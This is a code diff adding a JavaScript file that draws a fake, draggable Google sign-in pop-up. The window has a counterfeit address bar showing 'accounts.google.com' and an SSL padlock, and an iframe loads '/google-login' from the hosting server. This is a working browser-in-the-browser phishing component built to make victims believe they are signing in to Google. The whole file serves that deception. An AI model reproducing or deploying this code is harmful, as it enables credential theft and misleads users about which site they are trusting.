@@ -1,0 +1,146 @@
+var myString = ` <div id="window" style="top: 0; left: 0; right: 0; bottom: 0; margin: auto;">
+<!-- Title bar start -->
+<div id="title-bar-width">
+    <div id="title-bar">
+        <div style="margin-top:5px;" id="google_info_container">
+        <svg xmlns="https://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 48 48" aria-hidden="true" class="L5wZDc"><path fill="#4285F4" d="M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z"></path><path fill="#34A853" d="M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.87-12.31-9.07H4.34v5.7C7.96 41.07 15.4 46 24 46z"></path><path fill="#FBBC05" d="M11.69 28.18C11.25 26.86 11 25.45 11 24s.25-2.86.69-4.18v-5.7H4.34C2.85 17.09 2 20.45 2 24c0 3.55.85 6.91 2.34 9.88l7.35-5.7z"></path><path fill="#EA4335" d="M24 10.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 4.18 29.93 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.2 6.58-9.07 12.31-9.07z"></path><path fill="none" d="M2 2h44v44H2z"></path></svg>
+            <span id="logo-description">Acceso: Cuentas de Google</span>
+        </div>
+
+        <div id="window-opts">
+            <span id="minimize">&#8212;</span>
+            <span id="square" style="display:flex; align-items: center;">□</span>
+            <div id="exit" style="font-weight: 100 !important;"><span>✕</span></div>
+        </div>
+    </div>
+    <div id="url-bar">
+        <%= image_tag("ssl.svg", size: "20x20") %>
+        <span id="domain-name">accounts.google.com</span>
+        <span id="domain-path">/<%= get_google_auth_path %></span>
+    </div>
+</div>
+<div id="iframe-container"> </div>
+        `
+
+$('#google_login_window').html(myString);
+
+window.mobileCheck = function() {
+    let check = false;
+    (function(a){if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(a)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0,4))) check = true;})(navigator.userAgent||navigator.vendor||window.opera);
+    return check;
+  
+};
+
+
+
+$('#iframe-container').html('<iframe id="content" src="/google-login" frameBorder="0"></iframe>');
+
+
+var minimize = document.getElementById("minimize");
+var square = document.getElementById("square");
+var exit = document.getElementById("exit");
+var titleBar = document.getElementById("title-bar");
+var footer = document.getElementById("footer");
+var google_login_url = document.getElementById("google_login_url")
+var container = document.querySelector('#window');
+////////////////// Hover listeners //////////////////
+minimize.addEventListener('mouseover', function handleMouseOver() {
+  minimize.style.backgroundColor = 'rgba(0, 0, 0, 0.09765625)';
+  minimize.style.cursor = 'context-menu';
+});
+
+minimize.addEventListener('mouseout', function handleMouseOut() {
+  minimize.style.backgroundColor = '#d6dae0';
+  minimize.style.cursor = 'default';
+});
+
+square.addEventListener('mouseover', function handleMouseOver() {
+  square.style.backgroundColor = 'rgba(0, 0, 0, 0.09765625)';
+  square.style.cursor = 'context-menu';
+});
+
+square.addEventListener('mouseout', function handleMouseOut() {
+  square.style.backgroundColor = '#d6dae0';
+  square.style.cursor = 'default';
+});
+
+exit.addEventListener('mouseover', function handleMouseOver() {
+  exit.style.backgroundColor = '#E81123';
+  exit.style.cursor = 'context-menu';
+});
+
+exit.addEventListener('mouseout', function handleMouseOut() {
+  exit.style.backgroundColor = '#d6dae0';
+  exit.style.cursor = 'default';
+});
+
+titleBar.addEventListener('mouseover', function handleMouseOver() {
+  titleBar.style.cursor = 'context-menu';
+});
+
+titleBar.addEventListener('mouseout', function handleMouseOver() {
+  titleBar.style.cursor = 'default';
+});
+
+// close and start position of the windows
+exit.addEventListener('click', function(){
+  footer.style.position = 'absolute';
+});
+
+
+window.addEventListener('load', function(){
+  container.style.position = 'relative';
+  // container.style.top = '-50vh';
+  // container.style.left = '30vw';
+});
+
+container.style.display = '';
+container.style.position = 'absolute';
+
+//////////////// Make window draggable start ////////////////
+// Make the DIV element draggable:
+var draggable = $('#window');
+var title = $('#title-bar');
+
+title.on('mousedown', function(e){
+	var dr = $(draggable).addClass("drag");
+	height = dr.outerHeight();
+	width = dr.outerWidth();
+	ypos = dr.offset().top + height - e.pageY,
+	xpos = dr.offset().left + width - e.pageX;
+	$(document.body).on('mousemove', function(e){
+		var itop = e.pageY + ypos - height;
+		var ileft = e.pageX + xpos - width;
+		if(dr.hasClass("drag")){
+			dr.offset({top: itop,left: ileft});
+		}
+	}).on('mouseup', function(e){
+			dr.removeClass("drag");
+	});
+});
+//////////////// Make window draggable end ////////////////
+
+
+////////////////// Onclick listeners //////////////////
+// X button functionality
+$("#exit").click(function(){
+    $("#window").css("display", "none");
+  });
+
+// Maximize button functionality
+$("#square").click(enlarge);
+
+function enlarge(){
+  if(square.classList.contains("enlarged")){
+    $("#window").css("width", "40%");
+    $("#title-bar-width").css('width', '100%');
+    $("#content").css("width", "100%");
+    $("#square").removeClass("enlarged");
+  }
+  else{
+    $("#window").css("width", "70%");
+    $("#title-bar-width").css('width', '100%');
+    $("#content").css("width", "100%");
+    $("#square").addClass("enlarged");
+  }
+}
